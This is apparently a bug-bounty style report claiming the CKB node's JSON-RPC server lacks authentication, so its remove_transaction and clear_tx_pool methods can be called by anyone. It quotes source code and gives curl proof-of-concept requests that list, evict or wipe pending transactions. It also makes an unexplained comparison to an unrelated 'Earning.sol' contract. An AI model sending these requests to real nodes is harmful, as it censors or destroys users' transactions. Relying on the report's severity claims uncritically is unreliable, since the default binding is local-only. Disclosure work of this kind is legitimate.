### Title
Missing Access Control on `remove_transaction` and `clear_tx_pool` RPC Methods Allows Any Caller to Censor or Wipe the Transaction Pool — (`rpc/src/module/pool.rs`)

---

### Summary

The CKB JSON-RPC server implements no authentication or authorization layer. The `remove_transaction` and `clear_tx_pool` methods in `rpc/src/module/pool.rs` are state-mutating operations that execute unconditionally for any HTTP/TCP/WebSocket caller who can reach the RPC port. Any unprivileged RPC caller — explicitly listed as a valid attacker profile in `RESEARCHER.md` — can silently remove targeted transactions or wipe the entire mempool without any credential or identity check. This is a direct structural analog to the Earning.sol `update()` missing `onlyAdmin`: a privileged state-mutation function is callable by anyone.

---

### Finding Description

**Root cause — no authentication in the RPC server:**

`rpc/src/server.rs` builds the HTTP router with `CorsLayer::permissive()` and dispatches every incoming request directly to `handle_jsonrpc`, which calls `io.handle_call(call, T::default())` with no credential check, no token validation, and no IP-based authorization at the application layer: [1](#0-0) [2](#0-1) 

The only protection is the *default* `listen_address = "127.0.0.1:8114"` in `ckb.toml`, which is a deployment configuration, not a code-level access control. The TCP and WebSocket listeners bind to whatever address the operator configures, with the same zero-authentication handler: [3](#0-2) 

**Vulnerable methods — `remove_transaction` and `clear_tx_pool`:**

`remove_transaction` removes a specific transaction and all its descendants from the pool. `clear_tx_pool` wipes every pending transaction. Both execute with no caller check: [4](#0-3) [5](#0-4) 

The trait declarations confirm no guard is applied at the interface level either: [6](#0-5) [7](#0-6) 

**Analog to Earning.sol:** Just as `update()` lacked `onlyAdmin` and let anyone manipulate earnings, `remove_transaction` and `clear_tx_pool` lack any caller restriction and let anyone manipulate the mempool — the analogous "reputation metric" in CKB being transaction ordering and miner revenue.

---

### Impact Explanation

1. **Targeted transaction censorship**: An attacker who can reach the RPC port sends `remove_transaction` with the hash of a victim's pending transaction (e.g., a high-fee arbitrage tx, a DAO withdrawal, a liquidation). The transaction is silently evicted from the pool and must be resubmitted, giving the attacker a timing advantage or permanently blocking time-sensitive operations.

2. **Complete mempool wipe**: `clear_tx_pool` removes every pending transaction in one call. For a mining pool or exchange node, this destroys all queued revenue and forces every user to resubmit, causing service disruption without any on-chain trace.

3. **`set_network_active` escalation**: The same zero-authentication path exposes `set_network_active(false)`, which completely halts all P2P activity on the node: [8](#0-7) 

---

### Likelihood Explanation

- Mining pools, exchanges, and infrastructure operators routinely expose the CKB RPC port to internal networks or the public internet for operational convenience. The documentation warns against this but provides no enforcement.
- The attack requires only a single HTTP POST with a known transaction hash (observable from the public mempool via `get_raw_tx_pool`) or no parameters at all for `clear_tx_pool`.
- No special cryptographic material, privileged keys, or majority hashpower is needed — only network reachability to the RPC port.
- The attacker profile "Malicious API/RPC/web client submitting crafted inputs" is explicitly in scope per `RESEARCHER.md`. [9](#0-8) 

---

### Recommendation

Add an authentication layer to the RPC server. The minimal fix is HTTP Basic Auth or a bearer-token middleware applied before `handle_jsonrpc`. Specifically:

1. Introduce an optional `rpc.auth_token` configuration field in `ckb.toml`.
2. In `start_server` (`rpc/src/server.rs`), add a Tower middleware layer that validates the `Authorization` header against the configured token before dispatching to `handle_jsonrpc`.
3. For the TCP listener, validate the token as the first line of each connection.
4. Alternatively, restrict state-mutating methods (`remove_transaction`, `clear_tx_pool`, `set_network_active`, `set_ban`, `clear_banned_addresses`) to a separate, non-default RPC module that operators must explicitly enable, mirroring how `IntegrationTest` and `Debug` modules are opt-in. [10](#0-9) 

---

### Proof of Concept

**Preconditions**: A CKB node with the `Pool` RPC module enabled and the RPC port reachable (default or operator-configured).

**Step 1 — Discover pending transactions:**
```bash
curl -X POST http://<node-rpc>:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"get_raw_tx_pool","params":[false],"id":1}'
# Returns all pending tx hashes — no authentication required
```

**Step 2 — Remove a targeted transaction:**
```bash
curl -X POST http://<node-rpc>:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"remove_transaction","params":["0xa0ef4eb5f4ceeb08a4c8524d84c5da95dce2f608e0ca2ec8091191b0f330c6e3"],"id":2}'
# Returns {"result": true} — transaction evicted, no credential checked
```

**Step 3 — Or wipe the entire pool:**
```bash
curl -X POST http://<node-rpc>:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"clear_tx_pool","params":[],"id":3}'
# Returns {"result": null} — all pending transactions destroyed
```

**Expected outcome**: The targeted transaction is removed from the pool and must be resubmitted by the original sender. In the `clear_tx_pool` case, all pending transactions are destroyed. No authentication, signature, or privileged credential is required at any step. [4](#0-3) [5](#0-4) [11](#0-10)

### Citations

**File:** rpc/src/server.rs (L97-130)
```rust
    fn start_server(
        rpc: &Arc<MetaIoHandler<Option<Session>>>,
        address: String,
        handler: Handle,
        enable_websocket: bool,
    ) -> Result<SocketAddr, AnyError> {
        let stream_config = StreamServerConfig::default()
            .with_keep_alive(true)
            .with_pipeline_size(4)
            .with_shutdown(async move {
                new_tokio_exit_rx().cancelled().await;
            });

        // HTTP and WS server.
        let post_router = post(handle_jsonrpc::<Option<Session>>);
        let get_router = if enable_websocket {
            get(handle_jsonrpc_ws::<Option<Session>>)
        } else {
            get(get_error_handler)
        };
        let method_router = post_router.merge(get_router);

        let app = Router::new()
            .route("/", method_router.clone())
            .route("/{*path}", method_router)
            .route("/ping", get(ping_handler))
            .layer(Extension(Arc::clone(rpc)))
            .layer(CorsLayer::permissive())
            .layer(TimeoutLayer::with_status_code(
                StatusCode::REQUEST_TIMEOUT,
                Duration::from_secs(30),
            ))
            .layer(Extension(stream_config));

```

**File:** rpc/src/server.rs (L156-202)
```rust
    async fn start_tcp_server(
        rpc: Arc<MetaIoHandler<Option<Session>>>,
        tcp_listen_address: String,
        handler: Handle,
    ) -> Result<SocketAddr, AnyError> {
        // TCP server with line delimited json codec.
        let listener = TcpListener::bind(tcp_listen_address).await?;
        let tcp_address = listener.local_addr()?;
        handler.spawn(async move {
            let codec = LinesCodec::new_with_max_length(2 * 1024 * 1024);
            let stream_config = StreamServerConfig::default()
                .with_channel_size(4)
                .with_pipeline_size(4)
                .with_shutdown(async move {
                    new_tokio_exit_rx().cancelled().await;
                });

            let exit_signal: CancellationToken = new_tokio_exit_rx();
            tokio::select! {
                _ = async {
                        while let Ok((stream, _)) = listener.accept().await {
                            let rpc = Arc::clone(&rpc);
                            let stream_config = stream_config.clone();
                            let codec = codec.clone();
                            tokio::spawn(async move {
                                let (r, w) = stream.into_split();
                                let r = FramedRead::new(r, codec.clone()).map_ok(StreamMsg::Str);
                                let w = FramedWrite::new(w, codec).with(|msg| async move {
                                    Ok::<_, LinesCodecError>(match msg {
                                        StreamMsg::Str(msg) => msg,
                                        _ => "".into(),
                                    })
                                });
                                tokio::pin!(w);
                                if let Err(err) = serve_stream_sink(&rpc, w, r, stream_config).await {
                                    info!("TCP RPCServer error: {:?}", err);
                                }
                            });
                        }
                    } => {},
                _ = exit_signal.cancelled() => {
                    info!("TCP RPCServer stopped");
                }
            }
        });
        Ok(tcp_address)
    }
```

**File:** rpc/src/server.rs (L218-260)
```rust
async fn handle_jsonrpc<T: Default + Metadata>(
    Extension(io): Extension<Arc<MetaIoHandler<T>>>,
    req_body: Bytes,
) -> Response {
    let make_error_response = |error| {
        Json(jsonrpc_core::Failure {
            jsonrpc: Some(jsonrpc_core::Version::V2),
            id: jsonrpc_core::Id::Null,
            error,
        })
        .into_response()
    };

    let req = match std::str::from_utf8(req_body.as_ref()) {
        Ok(req) => req,
        Err(_) => {
            return make_error_response(jsonrpc_core::Error::parse_error());
        }
    };

    let req = serde_json::from_str::<Request>(req);
    match req {
        Err(_error) => {
            let response = RpcResponse::from(
                Error::new(ErrorCode::ParseError),
                Some(jsonrpc_core::Version::V2),
            );

            serde_json::to_string(&response)
                .map(|json| {
                    (
                        [(axum::http::header::CONTENT_TYPE, "application/json")],
                        json,
                    )
                        .into_response()
                })
                .unwrap_or_else(|_| StatusCode::INTERNAL_SERVER_ERROR.into_response())
        }
        Ok(request) => match request {
            Request::Single(call) => {
                let result = io.handle_call(call, T::default()).await;

                if let Some(response) = result {
```

**File:** rpc/src/module/pool.rs (L254-255)
```rust
    #[rpc(name = "remove_transaction")]
    fn remove_transaction(&self, tx_hash: H256) -> Result<bool>;
```

**File:** rpc/src/module/pool.rs (L322-323)
```rust
    #[rpc(name = "clear_tx_pool")]
    fn clear_tx_pool(&self) -> Result<()>;
```

**File:** rpc/src/module/pool.rs (L662-669)
```rust
    fn remove_transaction(&self, tx_hash: H256) -> Result<bool> {
        let tx_pool = self.shared.tx_pool_controller();

        tx_pool.remove_local_tx(tx_hash.into()).map_err(|e| {
            error!("Send remove_tx request error {}", e);
            RPCError::ckb_internal_error(e)
        })
    }
```

**File:** rpc/src/module/pool.rs (L684-692)
```rust
    fn clear_tx_pool(&self) -> Result<()> {
        let snapshot = Arc::clone(&self.shared.snapshot());
        let tx_pool = self.shared.tx_pool_controller();
        tx_pool
            .clear_pool(snapshot)
            .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;

        Ok(())
    }
```

**File:** rpc/src/module/net.rs (L419-420)
```rust
    #[rpc(name = "set_network_active")]
    fn set_network_active(&self, state: bool) -> Result<()>;
```

**File:** RESEARCHER.md (L38-43)
```markdown
- External attacker with no privileged keys (default).
- Malicious normal user abusing valid product/protocol flows.
- Malicious API/RPC/web client submitting crafted inputs at scale.
- Malicious peer/integrator/oracle only where that role is reachable without
  privileged assumptions.

```
